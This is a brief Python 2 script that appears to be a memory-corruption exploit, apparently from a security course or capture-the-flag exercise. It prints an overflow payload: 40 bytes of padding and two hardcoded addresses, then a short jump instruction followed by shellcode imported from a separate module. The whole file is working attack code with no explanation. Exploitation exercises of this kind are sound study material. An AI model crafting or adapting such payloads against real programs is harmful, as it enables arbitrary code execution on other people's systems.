from struct import pack
from shellcode import shellcode

print "aaaa"

print "a"*40+pack("<I",0x080f3780)+pack("<I",0xbffea1dc)

print "\xeb"+"\x06"+"a"*6+shellcode
